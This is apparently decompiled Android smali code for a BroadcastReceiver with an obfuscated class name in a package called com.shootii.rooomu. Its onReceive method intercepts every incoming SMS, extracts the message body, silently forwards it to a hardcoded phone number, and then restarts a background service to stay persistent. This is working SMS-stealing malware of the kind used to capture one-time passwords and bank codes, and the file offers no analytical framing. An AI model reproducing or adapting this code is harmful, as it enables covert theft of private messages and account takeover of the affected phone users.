.class public Lcom/shootii/rooomu/S1m2s3L4i5s6t7n8e9r0;
.super Landroid/content/BroadcastReceiver;
.source "SourceFile"


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .line 1
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    .line 4
    move-result-object v0

    .line 5
    if-eqz v0, :cond_0

    .line 7
    return-void

    .line 8
    :cond_0
    new-instance v0, LB1/a;

    .line 10
    invoke-direct {v0}, Ljava/lang/NullPointerException;-><init>()V

    .line 13
    const-class v1, LJ1/c;

    .line 15
    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 18
    move-result-object v1

    .line 19
    invoke-static {v0, v1}, LJ1/c;->g(Ljava/lang/RuntimeException;Ljava/lang/String;)V

    .line 22
    throw v0
.end method

.method public constructor <init>()V
    .locals 0

    .line 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 4
    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 11

    .line 1
    const-class v0, LJ1/c;

    .line 3
    if-eqz p1, :cond_a

    .line 5
    if-eqz p2, :cond_9

    .line 7
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 10
    move-result-object v1

    .line 11
    const-string v2, "android.provider.Telephony.SMS_RECEIVED"

    .line 13
    invoke-static {v1, v2}, LJ1/c;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 16
    move-result v1

    .line 17
    if-eqz v1, :cond_8

    .line 19
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    .line 22
    move-result-object p2

    .line 23
    if-eqz p2, :cond_7

    .line 25
    const-string v0, "pdus"

    .line 27
    invoke-virtual {p2, v0}, Landroid/os/BaseBundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    .line 30
    move-result-object v0

    .line 31
    check-cast v0, [Ljava/lang/Object;

    .line 33
    if-eqz v0, :cond_8

    .line 35
    array-length v1, v0

    .line 36
    const/4 v2, 0x0

    .line 37
    :goto_0
    if-ge v2, v1, :cond_8

    .line 39
    aget-object v3, v0, v2

    .line 41
    if-eqz v3, :cond_6

    .line 43
    check-cast v3, [B

    .line 45
    const-string v4, "format"

    .line 47
    invoke-virtual {p2, v4}, Landroid/os/BaseBundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    .line 50
    move-result-object v4

    .line 51
    if-eqz v4, :cond_5

    .line 53
    check-cast v4, Ljava/lang/String;

    .line 55
    invoke-static {v3, v4}, Landroid/telephony/SmsMessage;->createFromPdu([BLjava/lang/String;)Landroid/telephony/SmsMessage;

    .line 58
    move-result-object v3

    .line 59
    const-string v4, "currentMessage"

    .line 61
    if-eqz v3, :cond_4

    .line 63
    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    .line 66
    move-result-object v8

    .line 67
    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getMessageClass()Landroid/telephony/SmsMessage$MessageClass;

    .line 70
    move-result-object v3

    .line 71
    sget-object v4, Landroid/telephony/SmsMessage$MessageClass;->CLASS_0:Landroid/telephony/SmsMessage$MessageClass;

    .line 73
    if-eq v3, v4, :cond_3

    .line 75
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    .line 78
    move-result-object v5

    .line 79
    const/4 v9, 0x0

    .line 80
    const/4 v10, 0x0

    .line 81
    const-string v6, "+919381172328"

    .line 83
    const/4 v7, 0x0

    .line 84
    invoke-virtual/range {v5 .. v10}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 87
    const-string v3, "activity"

    .line 89
    invoke-virtual {p1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 92
    move-result-object v3

    .line 93
    check-cast v3, Landroid/app/ActivityManager;

    .line 95
    const v4, 0x7fffffff

    .line 98
    invoke-virtual {v3, v4}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    .line 101
    move-result-object v3

    .line 102
    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 105
    move-result-object v3

    .line 106
    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    .line 109
    move-result v4

    .line 110
    const-class v5, Lcom/shootii/rooomu/MyService;

    .line 112
    if-eqz v4, :cond_1

    .line 114
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 117
    move-result-object v4

    .line 118
    check-cast v4, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 120
    invoke-virtual {v5}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 123
    move-result-object v5

    .line 124
    iget-object v4, v4, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    .line 126
    invoke-virtual {v4}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    .line 129
    move-result-object v4

    .line 130
    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 133
    move-result v4

    .line 134
    if-eqz v4, :cond_0

    .line 136
    goto :goto_1

    .line 137
    :cond_1
    new-instance v3, Landroid/content/Intent;

    .line 139
    invoke-direct {v3, p1, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 142
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 144
    const/16 v5, 0x1a

    .line 146
    if-lt v4, v5, :cond_2

    .line 148
    invoke-static {p1, v3}, LA1/a;->r(Landroid/content/Context;Landroid/content/Intent;)V

    .line 151
    :cond_2
    :goto_1
    add-int/lit8 v2, v2, 0x1

    .line 153
    goto :goto_0

    .line 154
    :cond_3
    return-void

    .line 155
    :cond_4
    new-instance p1, Ljava/lang/IllegalStateException;

    .line 157
    const-string p2, " must not be null"

    .line 159
    invoke-virtual {v4, p2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 162
    move-result-object p2

    .line 163
    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    .line 166
    const-class p2, LJ1/c;

    .line 168
    invoke-virtual {p2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 171
    move-result-object p2

    .line 172
    invoke-static {p1, p2}, LJ1/c;->g(Ljava/lang/RuntimeException;Ljava/lang/String;)V

    .line 175
    throw p1

    .line 176
    :cond_5
    new-instance p1, LB1/e;

    .line 178
    const-string p2, "null cannot be cast to non-null type kotlin.String"

    .line 180
    invoke-direct {p1, p2}, Ljava/lang/ClassCastException;-><init>(Ljava/lang/String;)V

    .line 183
    throw p1

    .line 184
    :cond_6
    new-instance p1, LB1/e;

    .line 186
    const-string p2, "null cannot be cast to non-null type kotlin.ByteArray"

    .line 188
    invoke-direct {p1, p2}, Ljava/lang/ClassCastException;-><init>(Ljava/lang/String;)V

    .line 191
    throw p1

    .line 192
    :cond_7
    new-instance p1, LB1/a;

    .line 194
    invoke-direct {p1}, Ljava/lang/NullPointerException;-><init>()V

    .line 197
    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 200
    move-result-object p2

    .line 201
    invoke-static {p1, p2}, LJ1/c;->g(Ljava/lang/RuntimeException;Ljava/lang/String;)V

    .line 204
    throw p1

    .line 205
    :cond_8
    return-void

    .line 206
    :cond_9
    new-instance p1, Ljava/lang/IllegalArgumentException;

    .line 208
    const-string p2, "intent"

    .line 210
    invoke-static {p2}, LJ1/c;->f(Ljava/lang/String;)Ljava/lang/String;

    .line 213
    move-result-object p2

    .line 214
    invoke-direct {p1, p2}, Ljava/lang/IllegalArgumentException;-><init>(Ljava/lang/String;)V

    .line 217
    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 220
    move-result-object p2

    .line 221
    invoke-static {p1, p2}, LJ1/c;->g(Ljava/lang/RuntimeException;Ljava/lang/String;)V

    .line 224
    throw p1

    .line 225
    :cond_a
    new-instance p1, Ljava/lang/IllegalArgumentException;

    .line 227
    const-string p2, "context"

    .line 229
    invoke-static {p2}, LJ1/c;->f(Ljava/lang/String;)Ljava/lang/String;

    .line 232
    move-result-object p2

    .line 233
    invoke-direct {p1, p2}, Ljava/lang/IllegalArgumentException;-><init>(Ljava/lang/String;)V

    .line 236
    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 239
    move-result-object p2

    .line 240
    invoke-static {p1, p2}, LJ1/c;->g(Ljava/lang/RuntimeException;Ljava/lang/String;)V

    .line 243
    throw p1
.end method
